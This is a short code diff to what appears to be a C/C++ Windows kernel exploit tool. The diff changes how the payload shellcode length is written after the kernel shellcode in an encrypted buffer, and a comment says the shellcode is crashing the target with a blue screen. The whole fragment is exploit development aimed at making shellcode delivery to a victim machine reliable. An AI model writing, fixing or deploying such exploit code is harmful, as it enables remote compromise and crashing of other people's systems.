@@ -309,7 +309,10 @@ int main(int argc, char* argv[])
 
 	//add the payload shellcode length after the kernel shellcode
 	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, sizeof(DWORD));
+	
+	//remove the NULL terminator from the shellcode count
+        dwPayloadShellcodeSize -= 1; 
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, 2);
 
 	//TO FIX:
 	//Shellcode is BSODing the target because the length of the payload shellcode is not added
